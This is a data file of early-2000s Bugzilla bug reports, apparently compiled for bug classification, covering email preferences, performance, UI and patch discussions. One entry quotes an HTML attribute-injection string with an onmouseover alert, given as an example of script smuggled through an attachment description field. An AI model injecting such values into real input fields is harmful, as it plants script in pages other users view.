Id%TAB%Opening%TAB%Reporter%TAB%VerificationStatus%TAB%ResolutionStatus%TAB%RootCauseCategory%TAB%Components%TAB%Description%TAB%FullDescription
538%TAB%904184243%TAB%3791%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%HTML Dialogs,UI,Bugzilla-General%TAB%Bugzilla can't search bug lists for a text match%TAB%Bugzilla can't search bug lists for a text match
539%TAB%904196016%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%MIMELib,UI,Bugzilla-General%TAB%enter_bug.cgi chokes if we have multiple products.%TAB%enter_bug.cgi chokes if we have multiple products.
71552%TAB%984182373%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Remove oldemailtech from Bugzilla%TAB%Remove oldemailtech from BugzillaMaking this a 2.14.  It's not exactly security, but bugzilla.mozilla.org can't  easily cvs update again until this is yanked.  Regenerating the shadow directory  (the ASCII copies of all the bugs in ${BUGZILLA_HOME}/shadow that oldemailtech  uses to make the diffs it mails out) on running checksetup.pl takes approximately  7 hours to run on b.m.o with 71000 bugs.
71555%TAB%984184975%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl should set chmod permissions without $webservergroup%TAB%checksetup.pl should set chmod permissions without $webservergroupCurrently, checksetup.pl does absolutely nothing to your file permissions if you  aren't using $webservergroup.  It should be making everything world readable/executable in this situation, since  that probably means you're running it in a personal webspace (http://site.com/~user/bugzilla or the like) and don't have access to set the  files to the group of the web server.
71574%TAB%984224809%TAB%21544%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%"My Bugs" in Bugzilla looks wrong%TAB%"My Bugs" in Bugzilla looks wrongAfter the upgrade the "My Bugs" field at the bottom of the site is too large. This is very annoying when you have that field turned on in the prefs.  By "too large" do you mean because it's there all by itself?  That space can fill  up if you have a lot of saved queries that you have available in your footer,  because those go in the same spot.
71600%TAB%984271975%TAB%9911%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Email prefs are broken.%TAB%Email prefs are broken.Andreas added a comment and CCed himself on the above bug; I did not get bug  mail (and he was told so at the time.) I have turned off CC notification in my  bug preferences for when I am the reporter, but not comment notification.  I suspect that, at the moment, it seems that you don't get email if you are  uninterested in _any_ of the things which happened. The correct logic is for you  not to get mail only if you are uninterested in _all_ of the things which  happened.  I think we should consider posting to n.p.m.announce telling people not to use  the email prefs until we've resolved this - people may be losing important mail.
71607%TAB%984282525%TAB%1749%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Displays time in several different formats at the same time%TAB%Displays time in several different formats at the same timeWhen doing a search with a date column on I notice that the date formats are in (at least) three completely different formats. It's the normal (ISO) YYYY-MM-DD, but also a MM-DD or if it is DD-MM and one english textual date weekday HH:MM.   It get's confusing to have them all mixed up and in the case of "03-02" I don't know it's 2 March or 3 February (or is it maybe the time slightly malformed, 03:02 today?).  I would suggest to use the same format for all posts and if you really want to demonstrate cool technology making it a pref so that people can turn it on on will. For most uses, this will be a usability problem since you have to spend extra time parsing the date all the time because you don't know (your brain doesn't) how to read the date until you have read it, i.e. to use computer language you have to make two passes over it instead of one.
71625%TAB%984302046%TAB%422%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Getting oldemailtech notifications%TAB%Getting oldemailtech notificationsWhen hwaara@chello.se added himself to the CC list on 71623, I got an old-style bugmail notification.  According to the database, I have newemailtech turned on, and so does hwaara@chello.se.  My email flags are:  ExcludeSelf~on~emailOwnerRemoveme~on~emailOwnerComments~on~emailOwnerAttachments~on~emailOwnerStatus~on~emailOwnerResolved~on~emailOwnerKeywords~~emailOwnerCC~~emailOwnerOther~on~emailReporterRemoveme~on~emailReporterComments~on~emailReporterAttachments~on~emailReporterStatus~on~emailReporterResolved~on~emailReporterKeywords~on~emailReporterCC~~emailReporterOther~on~emailQAcontactRemoveme~on~emailQAcontactComments~on~emailQAcontactAttachments~on~emailQAcontactStatus~on~emailQAcontactResolved~~emailQAcontactKeywords~on~emailQAcontactCC~~emailQAcontactOther~on~emailCClistRemoveme~~emailCClistComments~on~emailCClistAttachments~on~emailCClistStatus~on~emailCClistResolved~on~emailCClistKeywords~~emailCClistCC~~emailCClistOther~  Håkan's are:  ExcludeSelf~on~emailOwnerRemoveme~on~emailOwnerComments~on~emailOwnerAttachments~on~emailOwnerStatus~on~emailOwnerResolved~on~emailOwnerKeywords~on~emailOwnerCC~~emailOwnerOther~on~emailReporterRemoveme~on~emailReporterComments~on~emailReporterAttachments~on~emailReporterStatus~on~emailReporterResolved~on~emailReporterKeywords~on~emailReporterCC~~emailReporterOther~on~emailQAcontactRemoveme~on~emailQAcontactComments~on~emailQAcontactAttachments~on~emailQAcontactStatus~on~emailQAcontactResolved~on~emailQAcontactKeywords~on~emailQAcontactCC~~emailQAcontactOther~on~emailCClistRemoveme~on~emailCClistComments~on~emailCClistAttachments~on~emailCClistStatus~~emailCClistResolved~on~emailCClistKeywords~~emailCClistCC~~emailCClistOther~  Help?
71658%TAB%984341261%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Attached patches should appear as (text/plain; patch)%TAB%Attached patches should appear as (text/plain; patch)Because right now they appear as (text/plain) which makes them indistiguishable  from other text files.  Bugzilla does keep track of whether it's a patch or not  (it's a separate radio button when you're uploading the attachment), so why not  display it?  True, I didn't notice that. But in createattachment.cgi it says "text/plain, diffs", we should use the same wording in each place (but I'm not sure which one is better).  The initial comment is a bit terse :) - that's why I was asking.
71659%TAB%984341659%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%New bugs do not create email if the reporter doesn't comment%TAB%New bugs do not create email if the reporter doesn't commentwhen i report bugs that include detailed comments, they're often marked as  invalid RFEs even though that is technically illegal.  It's much better for me  to write an empty bug and have someone ask for clarification than for me to  write a bug which is long and then deemed invalid. In general someone else is  much better able to describe what I want than I am [check my posting history].
71767%TAB%984410077%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Provide summary view for secure bugs%TAB%Provide summary view for secure bugsThe addition of the bug summary to the page <title> and the tooltips of bug links initially had the unwanted side-effect of leaking this information for secure bugs.  The "quick fix" was to not show the summary if the bug is secure, regardless of the user's permissions.  Effected files: show_bug.cgi (v1.14), duplicates.cgi (v1.4), globals.pl (v1.85)  This should be fixed for 2.14 to allow users with proper permissions to benefit from this information.
71793%TAB%984427415%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,User Interface%TAB%Make email preferences more compact%TAB%Make email preferences more compactI think the email preferences would be easier to read and easier to use if the  checkboxes were in a grid.  I'll attach an HTML mockup shortly.
71794%TAB%984428420%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Email%TAB%processmail shouldn't bother checking dependencies unless state changes.%TAB%processmail shouldn't bother checking dependencies unless state changes.I believe mail is not sent to any dependent bugs unless the bug being changed has  a state change.  Bearing this in mind, processmail should not even bother with  the "Checking dependencies for changes" bit unless the change being made is  worthy of notifying the dependent bugs anyway.  Right now you get a box on the  "Processed Bug" screen for each dependent bug telling you it didn't send any  mail.  What's the point?  :-)
71798%TAB%984430924%TAB%23239%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%bugmail not sent when moving from cc to assigned fields%TAB%bugmail not sent when moving from cc to assigned fieldstimeless reassigned to me, added ducarroz to cc, and commented on the referenced bug, and I didn't get any bugmail.  My prefs are basically set to only ignore cc-only changes, so I should have gotten mail.  per timeless, cgi feedback was: <timeless>  Email sent to: ducarroz@netscape.com, blakeross@telocity.com,             timeless@mac.com, disttsc@bart.nl <timeless>  Excluding: maolson@earthlink.net, matt@nightrealms.com,             sairuh@netscape.com
71808%TAB%984454844%TAB%14006%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Can't set email preferences for voted bugs.%TAB%Can't set email preferences for voted bugs.You can only set email preferences for owned, reported, QA or CC's bugs.  What happens to voted bugs?
71818%TAB%984465783%TAB%22599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Notification prefs (cc changes for cced bugs) don't work%TAB%Notification prefs (cc changes for cced bugs) don't workReproduction: 1. Change your prefs not to get mail for cc field changes for bug you are cced on. 2. Make such a change on auch a bug.  Actual result: Do do get mail for the change.  Expected result: No mail.
71840%TAB%984478440%TAB%4054%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%[RFE] Make comments referencable,[RFE] Make comments referenceable%TAB%[RFE] Make comments referencable,[RFE] Make comments referenceableComments cannot be referenced individually. It would be great if they could.  Here is a proposed patch (the line which changes is the one with lots of "---"  on it. I add a <A NAME=""> bit).  http://www.hixie.ch/bugzilla/ is currently running with this change.   ***** globals.pl before *****      $query .= "ORDER BY longdescs.bug_when";     SendSQL($query);     while (MoreSQLData()) {         my ($who, $email, $when, $text) = (FetchSQLData());         $email .= Param('emailsuffix');         if ($count) {             $result .= "<BR><BR><I>------- Additional Comments From ";               if ($who) {                   $result .= qq{<A HREF="mailto:$email">$who</A> } .                       time2str("%Y-%m-%d %H:%M", str2time($when)) .                           " -------</I><BR>\n";               } else {                   $result .= qq{<A HREF="mailto:$email">$email</A> } .                       time2str("%Y-%m-%d %H:%M", str2time($when)) .                           " -------</I><BR>\n";               }         }         $result .= "<PRE>" . quoteUrls(\%knownattachments, $text) . "</PRE>\n";         $count++;     }   ***** globals.pl after *****      $query .= "ORDER BY longdescs.bug_when";     SendSQL($query);     while (MoreSQLData()) {         my ($who, $email, $when, $text) = (FetchSQLData());         $email .= Param('emailsuffix');         if ($count) {             $result .= "<BR><BR><I>------- <A NAME='$count'>Additional Comments  From</A> ";               if ($who) {                   $result .= qq{<A HREF="mailto:$email">$who</A> } .                       time2str("%Y-%m-%d %H:%M", str2time($when)) .                           " -------</I><BR>\n";               } else {                   $result .= qq{<A HREF="mailto:$email">$email</A> } .                       time2str("%Y-%m-%d %H:%M", str2time($when)) .                           " -------</I><BR>\n";               }         }         $result .= "<PRE>" . quoteUrls(\%knownattachments, $text) . "</PRE>\n";         $count++;     }
71912%TAB%984511043%TAB%1689%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Mail notification prefs for CC's are wrong-headed,add email pref "if I'm added to that capacity"%TAB%Mail notification prefs for CC's are wrong-headed,add email pref "if I'm added to that capacity"I like the flexibility of the new bugzilla mail prefs--kudos to all--but I  think the "CC" option missed the boat.  In part e-mail notifications are a convenience, an "event" if you will, but in  large part they are there so we can keep an eye out for damage to the bug data  (whether well-meaning or malicious). I don't give a hoot if Joe CC's himself or  removes himself, but I do care if  1) someone CC's me on a bug -- it means they think I should look at it  2) someone removes my CC from a bug -- why the f*** did they do that?  3) someone adds or removes non-self CC's on bugs I'm otherwise watching -- keep  an eye out for potential mischief.  There are too many Joes, so I and most everyone will turn off the CC  notifications. This means that in case 1) I may not see the bug for a while,  not until the next update. This will in turn result in some folks  figuring this out and so adding a comment at the same time they CC me,  defeating the purpose for folks who turn off the CC field. In the second case I  may simply never know, and will thus miss whatever I was watching for. And in  the third case I'll not notice that someone is munging my bugs.  I think this needs re-thinking a bit.
72177%TAB%984708613%TAB%15478%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Email%TAB%email filtering consistency%TAB%email filtering consistencyAs much as I appreciate the new email filtering options, I think they should be consistent to avoid confusion, i.e. a checked box should always mean the same, e.g. "send me mail" or "don't send me mail".  The first option is labeled "Do not email me bugs that I change" (negative) while all the other ones are labeled "email me when ..." (positive).  So I suggest reversing the first checkbox to read "Email me bugs that I change".  This way I could see by a quick glance whether I have any filtering options active (anything not checked) or not.
72184%TAB%984718114%TAB%4432%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs%TAB%BugZilla fails to create large attachments...,Check for SQL size limit before inserting comment into database%TAB%BugZilla fails to create large attachments...,Check for SQL size limit before inserting comment into databaseYes, this was an accident - I quoted the full response from BugZilla (which was too large, too - seems that form submission in general has problems with large incoming forms, not only a problem of the attachment CGI). Maybe we should rename this bug to "BugZilla creates Bug entries for _failed_ submissions"... !?
72379%TAB%984870217%TAB%6303%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%query.cgi?component= is not SELECTEDing the option,query.cgi component value does not reload form SELECTED item%TAB%query.cgi?component= is not SELECTEDing the option,query.cgi component value does not reload form SELECTED itemOverview:  A bugzilla query.cgi URL including a value for the Component form control will generate a query page that *does not* have the SELECTED attibute on  any of the <OPTION>s of the <SELECT> NAMEd "compoenent". This mean that the resulting buglist will unexpectedly not be limited to matches to the  selected component.  Corresponding buglist.cgi URLs, including remembered queries, work as expected.  Steps to reproduce: 1. Click on the URL link above.  2. Observe the form. The FIXED resolution, the Webtools product,     and the Bonsai component should be SELECTED. 3. Click on Bonsai to select it. 4. Submit the form. 5. At the bottom of the buglist, click on the _Edit this query_ link. 6. Observe the form again. 7. Click the browser's [Back] button twice. 8. Observe the form again.  Expected Results: A. In steps 2, 6, and 8, the Component <SELECT> should have the "Bonsai"    <OPTION> SELECTED. B. If step 3 is left out, the buglist should contain only Bonsia bugs.  Actual Results: A. In steps 2, 6, and 8, the Component <SELECT> *does not* have the "Bonsai"    (or any) <OPTION> SELECTED. B. If step 3 is left out, the buglist will contain bugs from all Webtools    components.  Tested with: * Both bugzilla.mozilla.org and landfill.tequilarista.org * NN4.76, current Mozilla, and IE5.5 * Other Product/Component pairs Same results on each trial.  Additional Information: This is a regression. It can cause a reasonably tightly crafted query.cgi URL stored as a bookmark or a link on a webpage to end up requesting a HUGE buglist if the user doesn't manually fix up the form before submitting it.  At the bottom of  http://www.mozilla.org/quality/help/screening-duplicates.html there is a set of links to generate buglists for Browser-General bugs  submitted in the last week for all platforms, Linux-only, Mac-only,  and a final link called /Customize/ that is the same query as a query.cgi, so the user can, for instance, change the date range or put something in the Summary textbox. Right now, if the [Submit query] button is clicked, the buglist will contain *all* Browser product bugs submitted in the last week. Needless to say, before screening-duplicates.html went live all those links were tested and the buglist was limited to "Browser-General" as intended.
72487%TAB%984990455%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General,attachment and request management%TAB%Create Attachment should allow user to create another attachment%TAB%Create Attachment should allow user to create another attachmenta user's description could be: " onmouseover="alert('i am silly')" but the only person who would be affected by that is the person who made the  attachment.  Seeking new r=.  patch features: adds link and title for newly created attachment and adds  create another attachment following table.
72721%TAB%985099161%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%duplicates.cgi performs poorly with lots of bugs%TAB%duplicates.cgi performs poorly with lots of bugsOn bugzilla.mozilla.org, duplicates.cgi sorts all 7000 dupes in a hash prior to display, which takes an unacceptably long time. I've made it so that it first weeds out all bugs with a dup_count below a certain value, which is a param.   I've also added "Click to sort" column headings, refactored the code a bit and generally tidied it up. This should hopefully make duplicates.cgi "2.12-ready", but it'll need testing on there, as I can't test it with a DB that big.   There's still no easy interface to changing the time difference for the "changed since" column, but that can wait. Suggestions as to how to do this are welcome.  Patch to follow.
72837%TAB%985165971%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Administration%TAB%Bugzilla should produce JS version of Components/Products etc.%TAB%Bugzilla should produce JS version of Components/Products etc.We have continual trouble updating the Bugzilla Helper to keep in sync with  component changes - the results of falling behind are scary messages about  "database corruption". What we really need is for Bugzilla to generate a .js  file with data structures in to hold this information. This could then be used  by the Bugzilla query form and things like Bugzilla Helper.  The query form already has something like this in it; splitting them off into a  separate file shouldn't be too hard. Filing this bug to keep track of the idea,  but it's probably 2.16 at the earliest. :-
72862%TAB%985174071%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%<q src="tinderbox" class="warning,orange">globals.pl uses relationset requires globals.pl</q>%TAB%<q src="tinderbox" class="warning,orange">globals.pl uses relationset requires globals.pl</q>I think this is the problem both bugzilla tinderboxes are orange due to compilation warnings in  globals.pl.  globals.pl uses relationset, and relationset.pm requires globals.pl globals.pl is not a proper perl module that can be accessed with "use", hence the "requires" hack.  Fix that, and I think this problem should go away.  "requires" is not supposed to load a module if it's already loaded.  Is there  something weird about the way it's being called that causes Perl to think it  hasn't been loaded yet?
72863%TAB%985174115%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%clean processbug output,Remove ugly table shown when posting/changing a bug%TAB%clean processbug output,Remove ugly table shown when posting/changing a buga) Which patch is the current one they were all current, merely a matter of perspective.  i want the first one  for sure, the others are really a, do we want this or that or ... b) Whether it's still relevant i think so c) Whether or not it still applies cleanly (and refresh it if not) *shrug* d) What cross-browser testing you've done on the HTML changes probably mozilla nc4 and maybe ie5. the html changes are safe, there's nothing  fancy involved.
72948%TAB%985203253%TAB%4054%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mozbot,Query/Bug List%TAB%use OS not platform when giving bug summary,default column list should include OS and not Platform%TAB%use OS not platform when giving bug summary,default column list should include OS and not PlatformWould it make sense to change the default bugzilla collumn from Platform to OS?
73180%TAB%985315453%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%versioncache should say it's not editable.%TAB%versioncache should say it's not editable.nstead of just saying it's automatically generated, how about saying what  generates it?  "This file is automatically generated once per hour by the  GenerateVersionTable() routine in globals.pl".  This way if some enterprising  soul like the reporter on bug 47943 would know where he has to go to fix it up if  they really want to do the fixing anyway.  Matthew Tuck [:CodeMachine] Assignee
73249%TAB%985352822%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%main::sendEmail() called too early <q class="bugzilla,warning" src="tinderbox"/>%TAB%main::sendEmail() called too early <q class="bugzilla,warning" src="tinderbox"/>Running /usr/bonsaitools/bin/perl -cwT  -I/home/httpd/cgi-bin/mozilla/webtools/bugzilla/ mysqld-watcher.pl; Results: mysqld-watcher.pl has compilable perl syntax. Warnings:  main::sendEmail() called too early to check prototype at         /home/httpd/cgi-bin/mozilla/webtools/bugzilla/mysqld-watcher.pl line 79
73330%TAB%985442320%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Email%TAB%too much space at top of bugmail%TAB%too much space at top of bugmailIf someone adds comments to a bug but doesn't change any other fields, the  bugmail I get has five blank lines between the bug URL and the "additional  comments" line.  That forces me to scroll down just to see who made the  change.  IMO, there should just be one blank line.
73502%TAB%985612328%TAB%11219%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs%TAB%midair collision checks don't cover other bugs changing dependancies%TAB%midair collision checks don't cover other bugs changing dependanciesWhile I was editing bug 73447, darin added that bug as a dependancy of bug 73293. I then committed the changes to bug 73447, and the dependancy got overwritten without warning - the first I knew about it was when the process_bug page listed mail sent to people about other bugs, and when I got the email from both bugs.
73665%TAB%985694891%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Need an "emailprefs" table,Create an "emailprefs" table%TAB%Need an "emailprefs" table,Create an "emailprefs" tableCurrently, the e-mail filtering prefs are all stored in a field in the profiles table called "emailflags" and seperated by tildes (~).  As discussed in IRC, this should really be stored in a table of it own.    My basic thinking is that this should gave two columns, event and value (generic names, nothing in stone).  Event would be what we currently have w/emailOwnerRemoveme and value would be "1" for filtered.  Notice that having the value 1 makes it filtered (nomail).  If there is now emailOwnerRemoveme for a particular user, it should default to sending mail (the checkbox is checked in editprefs.cgi).  While this logic may seem backwards, it allows the amount of data stored to be much smaller (an entry in the table is only created if a user doesn't want mail, if the later decide they do want mail on that type of change, simply remove the row from the table).
73959%TAB%985850182%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%My Votes doesn't show up on buglist.cgi,My Votes doesn't show up on buglist.cgi or attachment.cgi%TAB%My Votes doesn't show up on buglist.cgi,My Votes doesn't show up on buglist.cgi or attachment.cgiThe link to My Votes in the page footer does not show up on the buglist.cgi page. This is caused by the fact that: if (!defined $::anyvotesallowed) {     GetVersionTable(); }  Occurs *after*: if ($::anyvotesallowed) {     $html .= " | <A HREF=\"showvotes.cgi\">My votes</A>"; }  in CGI.pl's GetCommandMenu().  Patch forthcoming.
74032%TAB%985873623%TAB%27134%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Password stored in plaintext on the MySQL Data Base.%TAB%Password stored in plaintext on the MySQL Data Base.System administrators at my site are concerned about my running bugzilla in one  of their machines since users tend to use the same password for bugzilla and  for their login account in the other machines. This password being plaintext in  the DB mekes it available to the bugzilla admin (me) at any time.  Password should be only stored in it's encrypted form on the DB.
74355%TAB%986160738%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%[rfe] bug title in tooltip for full-url buglinks,Set tooltip to bug title for full-url buglinks%TAB%[rfe] bug title in tooltip for full-url buglinks,Set tooltip to bug title for full-url buglinksAll of these should get tooltips, but the last one doesn't:
74394%TAB%986200059%TAB%21302%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%editmilestones.cgi can't edit the name and sortkey at the same time%TAB%editmilestones.cgi can't edit the name and sortkey at the same timeAt present, if you use editmilestones to change the milestone and the sort key  at the same time, it changes the milestone name, but leaves the sort key  unchanged. This is because it uses the original milestone name in the query  after it has already updated it to the new name.  Patch (to be attached) causes it to update the sort key _before_ the milestone  name, such that both can be updated simultaneously.
74529%TAB%986271274%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Problem with bugmail.,Problem with bugmail filtering%TAB%Problem with bugmail.,Problem with bugmail filteringYikes.  There was a slight logic error in the last checkin to processmail (bug 71798).  Basically, a missing ! is causing some bugmail to be supressed.
75176%TAB%986733144%TAB%13272%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs,attachment and request management%TAB%marking attachments as "obsolete"%TAB%marking attachments as "obsolete"This is similar to bug 44595 "[RFE] Need ability to edit/delete attachments". While that bug affects the attachment content, this bug mainly adds new information to the database that makes it possible to hide "obsolete" attachments. (Deletion of obsolete attachments could then be implemented later.)  Proposal: - If a bug has any attachments, there should be an additional link near "Create a new attachment" named "Manage existing attachments" (or perhaps "Change" or "Edit" instead of "Manage"). - Clicking on this link should describe the current possibilities to change attachments and display a list of all attachments with a checkbox next to each, similar to the "My Bugs" page (showvotes.cgi). A checked checkbox would mean the attachment is marked "obsolete". - Everyone with "can edit all bugs" permission should be able to toggle the "obsolete" switch and submit the change. The submitter of an attachment should have that permission, too. - In a bug view, only non-obsolete attachments should be shown by default. If there are obsolete attachments for a bug, an additional link should appear to show obsolete attachments, too. But even on that "all attachments" list, obsolete attachments should appear visually different from non-obsolete attachments. This could be done by applying a "strike-through" style to obsolete attachments. For a quick start, this page could be the same as the "Manage attachments" page. - Links like this: "attachment 1234 [details]" should have strike-through style iff the attachment is obsolete.  Implementing this would require an additional field to be added to the attachments table: attachment.isobsolete, probably similar to attachment.ispatch
75349%TAB%986848629%TAB%13781%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla Helper,Bugzilla-General%TAB%Javascript error in Helper%TAB%Javascript error in HelperJavaScript Error: http://www.mozilla.org/quality/help/bugreport.js, line 90:  try is a reserved identifier.               try { ............^  JavaScript Error: http://www.mozilla.org/quality/help/bugzilla-helper.html, line 7:  PrefillBugInfoForm is not defined.  JavaScript Error: http://www.mozilla.org/quality/help/bugzilla-helper.html, line 765:  OpenEnterBugPage is not defined.  JavaScript Error: http://www.mozilla.org/quality/help/bugzilla-helper.html, line 765:  OpenEnterBugPage is not defined.  JavaScript Error: http://www.mozilla.org/quality/help/bugzilla-helper.html, line 765:  OpenEnterBugPage is not defined.
75482%TAB%986918004%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%RFE: deactivate groups and prevent bugs being added to them%TAB%RFE: deactivate groups and prevent bugs being added to themThere are situations in which a Bugzilla installation may want to "close out" a bug group over time rather than immediately by making it possible for users to continue working on bugs in the group without giving them the ability to extend the life of the group by adding new bugs to it.  Since access to the bugs should remain restricted, releasing the bugs back into the wild and deleting the group is not an option.  One solution is to add a column to the "groups" table that records whether or not a group is active.  An active group can be used in the same way groups are used in Bugzilla today.  An inactive group, on the other hand, has certain restrictions on how it can be used that are intended to discourage further use of the group.  In particular, it is not possible to add bugs to an inactive group.  There may also be other restrictions on that group.  I have created a patch that adds UI to the "Edit Groups" screen for de/activating groups and hides the UI in the "Edit Bug" screen for adding a bug to an inactive group.  The following SQL command adds the appropriate column to the "groups" table, and I will attach a patch with my changes to bug_form.pl and editgroups.pl:  ALTER TABLE groups ADD COLUMN isactive TINYINT NOT NULL DEFAULT 1;  -myk
75488%TAB%986921274%TAB%15368%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%[meta] Bufzilla needs a perf speedup,[meta] Bugzilla needs a performance speedup%TAB%[meta] Bufzilla needs a perf speedup,[meta] Bugzilla needs a performance speedupWhile mysql's speed is a fiven (portinf is a different thinf), the cfi scripts  could be speedup. This meta buf is intended to track measures that  could be done to speed up bufzilla.
75840%TAB%987090648%TAB%4415%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%syncshadowdb needs to be more flexible%TAB%syncshadowdb needs to be more flexiblesome improvements i'd like to make to syncshadowdb. i'm adding these as  command line options.  mysqldump's for mozilla.org's database are collosal and need to be stored on a different filesystem from where the bug database lives. make the location of the tmp file be configurable.  bugzilla.mozilla.org is completely unusable anyway during a mysqldump. I'd like syncshadowdb to turn off bugzilla during this process.  Doing a mysqldump is a lenghy process and our nightly backup process does two of them. The first one is done by the process that recreates the shadowdb and then a second mysqldump command is issued which creates the dump file that is actually used. I'd like to be able  to disable the automatic  deletion of the dump created by syncshadowdb and use that file as the  backup.  going to attach a patch that implement the first two items.
76029%TAB%987215545%TAB%27630%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla 3,Bugzilla,Documentation%TAB%http://bugzilla.mozilla.org/12345 should get bug 12345%TAB%http://bugzilla.mozilla.org/12345 should get bug 12345This is the way the debian bug system works (bugs.debian.org) and it would be very nice to have in bugzilla, to make going to a particular bug more convenient.
